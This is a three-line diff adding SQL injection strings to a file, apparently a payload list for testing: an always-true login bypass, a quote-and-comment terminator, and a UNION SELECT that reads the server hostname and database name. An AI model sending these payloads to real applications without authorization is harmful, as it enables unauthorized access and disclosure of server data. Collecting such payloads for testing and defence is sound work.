@@ -1,0 +1,3 @@
+' OR '1'='1
+#'
+' union select @@hostname,database() #
